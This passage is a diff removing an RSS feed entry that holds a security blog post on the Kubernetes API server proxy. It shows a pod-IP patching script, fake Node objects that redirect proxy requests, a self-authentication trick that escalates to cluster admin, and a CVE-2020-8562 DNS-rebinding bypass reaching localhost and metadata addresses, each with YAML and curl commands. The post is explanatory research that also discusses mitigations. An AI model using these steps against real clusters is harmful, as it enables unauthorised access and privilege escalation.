-  &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POD&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-orig&lt;/span&gt;.json |
-    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/&quot;podIP&quot;: &quot;.*&quot;,/&quot;podIP&quot;: &quot;&apos;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TARGETIP&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&quot;,/g&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-      &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-patched.json&quot;&lt;/span&gt;
-
-  curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type:application/merge-patch+json&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; PATCH &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-patched.json&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-    &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/api/v1/namespaces/default/pods/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/status&quot;&lt;/span&gt;
-
-  &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-orig.json&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-patched.json&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With this script looping, you can make a request like&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver/proxy/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and you’ll get the response from the Target IP (in this case 1.1.1.1)&lt;/p&gt;
-
-&lt;h3 id=&quot;fake-node-objects&quot;&gt;Fake Node objects&lt;/h3&gt;
-
-&lt;p&gt;Another route to achieving this goal can be to create fake node objects in the cluster (assuming you’ve got the rights to do that). How well this one works depends a bit on the distribution as some will quickly clean up any fake nodes that are created, but it works fine in vanilla Kubernetes.&lt;/p&gt;
-
-&lt;p&gt;What’s handy here is that we can use hostnames instead of just IP addresses so something like&lt;/p&gt;
-
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Node&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;fakegoogle&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;addresses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.google.com&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Hostname&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Will then allow us to issue a curl request like&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/http:fakegoogle:80/proxy/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and get a response from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.google.com&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;getting-the-api-server-to-authenticate-to-itself&quot;&gt;Getting the API Server to authenticate to itself&lt;/h3&gt;
-
-&lt;p&gt;An interesting variation on this idea was noted in the Kubernetes 1.24 Security audit and is currently still an &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/119270&quot;&gt;open issue&lt;/a&gt; so exploitable. This builds on the idea of a fake node by adding additional information to say that the kubelet port on this node is the same as the API server’s port. This causes the API server to authenticate to itself and allows someone with create node and node proxy rights to escalate to full cluster admin.&lt;/p&gt;
-
-&lt;p&gt;A YAML like this&lt;/p&gt;
-
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Node&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kindserver&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;addresses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;172.20.0.3&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ExternalIP&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;daemonEndpoints&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;kubeletEndpoint&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;na&quot;&gt;Port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;6443&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;can be applied and then curl commands like the one below get access to the API server&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/https:kindserver:6443/proxy/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;cve-2020-8562---bypassing-the-blocklist&quot;&gt;CVE-2020-8562 - Bypassing the blocklist&lt;/h3&gt;
-
-&lt;p&gt;Another point to note about the API server proxy is that it might be possible to bypass the blocklist that’s in place via a known, but unpatchable, CVE (There’s a great blog with details on the original CVE from the reporter &lt;a href=&quot;https://business.blogthinkbig.com/kubernetes-vulnerability-discovered-allows-access-restricted-networks-cve-2020-8562/&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
-
-&lt;p&gt;There is a TOCTOU vulnerability in the API servers blocklist checking that means, if you can make requests to an address you control via the API server proxy, you might be able to get the request to go to IP addresses like localhost or the cloud metadata service addresses like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;169.254.169.254&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/CVE-2020-8562.png&quot; alt=&quot;CVE-2020-8562&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Exploiting this one takes a couple of steps. Firstly we can use a fake node object, as described in the previous section, then we’ll need a DNS service that resolves to different IP addresses alternately.&lt;/p&gt;
-
-&lt;p&gt;Fortunately for us, there’s an existing service we can use for the rebinding, https://lock.cmpxchg8b.com/rebinder.html.&lt;/p&gt;
-
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Node&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rebinder&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;addresses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2d21209c.7f000001.rbndr.us&lt;/span&gt; 
-    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Hostname&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With that created we can use the URL below to try and access the configuration of the kube-proxy component which is only listening on localhost.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/http:rebinder:10249/proxy/configz
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As this is a TOCTOU it can take quite a few attempts to get a response. You should see 3 possibilities. firstly a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;400&lt;/code&gt; response which happens when the blocklist check fails. Secondly a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;503&lt;/code&gt; response where it goes to the external address (in this case the IP address for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanme.nmap.org&lt;/code&gt;) and doesn’t get a response on that URL, and lastly when the TOCTOU is successful you’ll get the response back from the proxy service. I generally have found that &amp;lt; 30 requests is needed for a “hit” using this technique.&lt;/p&gt;
-
-&lt;p&gt;One place where this particular technique is interesting is obviously cloud hosted Kubernetes clusters, and in particular managed providers where they probably don’t want cluster operators requesting localhost interfaces on machines they control :)&lt;/p&gt;
-
-&lt;p&gt;To mitigate this many of the ones I’ve looked at use &lt;a href=&quot;https://kubernetes.io/docs/tasks/extend-kubernetes/setup-konnectivity/&quot;&gt;Konnectivity&lt;/a&gt; which is &lt;em&gt;yet another&lt;/em&gt; proxy and can be configured to ensure that any requests that come in from user controlled addresses are routed back to the node network and away from the control plane network.&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;The Kubernetes API server proxy is a handy feature for a number of reasons but obviously making any service a proxy is a tricky proposition from a security standpoint.&lt;/p&gt;
-
-&lt;p&gt;If you’re a cluster operator it’s important to be very careful with who you provide proxy rights to, and if you’re considering creating a managed Kubernetes service where you don’t want cluster owners to have access to the control plane, you’re going to need to be very careful with network firewalling and ensuring that the proxy doesn’t let them get to areas that should be restricted!&lt;/p&gt;
-</description>
-				<pubDate>Sat, 18 Jan 2025 10:00:00 +0000</pubDate>
-				<link>https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</guid>
 			</item>
 		
 	</channel>
